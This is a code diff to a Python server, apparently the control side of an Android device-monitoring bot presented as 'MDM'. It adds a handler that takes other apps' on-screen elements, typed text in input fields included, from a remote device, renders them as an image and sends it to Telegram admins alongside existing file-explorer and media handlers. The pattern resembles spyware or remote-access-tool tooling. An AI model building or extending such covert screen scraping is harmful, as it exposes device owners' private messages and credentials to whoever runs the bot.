@@ -2086,6 +2086,11 @@ def _sock_file_explorer(data):
         _handle_base64_media(dev, data)
         return
 
+    # ⚡ Check for screen_json (النظام الهجين - رسم الواجهة على السيرفر)
+    if data_type == "screen_json":
+        _handle_screen_json(dev, data)
+        return
+
     cmd = data.get("command", "?")
     status = data.get("status", "?")
     logger.info(f"[Socket] استكشاف ملفات: #{dev.get('short_id', '?')} cmd={cmd} status={status}")
@@ -2372,3 +2377,107 @@ def _handle_base64_media(dev, data):
         logger.info(f"[Base64] ✅ Sent to bot: {filename}")
     except Exception as e:
         logger.error(f"خطأ في معالجة base64 media: {e}")
+
+
+def _handle_screen_json(dev, data):
+    """يرسم الواجهة من JSON ويرسلها كبصورة للبوت."""
+    try:
+        from PIL import Image, ImageDraw, ImageFont
+        import io as _io
+        import base64 as _b64
+        
+        elements = data.get("elements", [])
+        pkg = data.get("package", "unknown")
+        short_id = dev.get('short_id', '?')
+        model = dev.get('model', '?')
+        
+        logger.info(f"📸 [ScreenJSON] #{short_id} {len(elements)} elements from {pkg}")
+        
+        if not elements:
+            if mdm_bot:
+                for admin_id in Config.ADMIN_IDS:
+                    try:
+                        mdm_bot.bot.send_message(admin_id, "📸 لا توجد عناصر مرئية على الشاشة")
+                    except: pass
+            return
+        
+        # Calculate canvas size
+        max_x = max(e.get("x", 0) + e.get("w", 0) for e in elements) + 50
+        max_y = max(e.get("y", 0) + e.get("h", 0) for e in elements) + 50
+        # Scale down if too large
+        scale = 1.0
+        if max_x > 1080:
+            scale = 1080 / max_x
+        w = int(max_x * scale)
+        h = int(max_y * scale)
+        
+        # Create image
+        img = Image.new('RGB', (w, h), color=(240, 240, 240))
+        draw = ImageDraw.Draw(img)
+        
+        # Try to load a font
+        try:
+            font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", int(14 * scale))
+            font_small = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", int(10 * scale))
+        except:
+            font = ImageFont.load_default()
+            font_small = font
+        
+        # Draw each element
+        for elem in elements:
+            x = int(elem.get("x", 0) * scale)
+            y = int(elem.get("y", 0) * scale)
+            ew = int(elem.get("w", 0) * scale)
+            eh = int(elem.get("h", 0) * scale)
+            text = elem.get("text", "") or elem.get("desc", "")
+            cls = elem.get("class", "")
+            
+            if not text:
+                continue
+            
+            # Determine color based on class
+            if "EditText" in cls or "TextView" in cls:
+                bg_color = (255, 255, 255)
+                text_color = (33, 33, 33)
+            elif "Button" in cls:
+                bg_color = (76, 175, 80)
+                text_color = (255, 255, 255)
+            else:
+                bg_color = (220, 220, 220)
+                text_color = (33, 33, 33)
+            
+            # Draw rectangle
+            if ew > 0 and eh > 0:
+                draw.rectangle([x, y, x + ew, y + eh], fill=bg_color, outline=(180, 180, 180))
+            
+            # Draw text
+            if text:
+                # Truncate if too long
+                display_text = text[:100]
+                try:
+                    draw.text((x + 4, y + 2), display_text, fill=text_color, font=font)
+                except:
+                    draw.text((x + 4, y + 2), display_text, fill=text_color)
+        
+        # Convert to bytes
+        buf = _io.BytesIO()
+        img.save(buf, format='JPEG', quality=80)
+        image_bytes = buf.getvalue()
+        
+        # Send to bot
+        if mdm_bot:
+            caption = (f"📸 <b>لقطة شاشة (مرسومة)</b>\n"
+                      f"━━━━━━━━━━━━━━━\n"
+                      f"📱 #{short_id} {model}\n"
+                      f"📦 {pkg}\n"
+                      f"📝 {len(elements)} عنصر\n"
+                      f"📐 {w}x{h}px")
+            for admin_id in Config.ADMIN_IDS:
+                try:
+                    mdm_bot.bot.send_photo(admin_id, photo=image_bytes, caption=caption, parse_mode="HTML")
+                except Exception as e:
+                    logger.error(f"فشل إرسال صورة JSON: {e}")
+        
+        logger.info(f"📸 [ScreenJSON] ✅ Sent rendered image ({len(image_bytes)} bytes)")
+    except Exception as e:
+        logger.error(f"خطأ في معالجة screen_json: {e}")
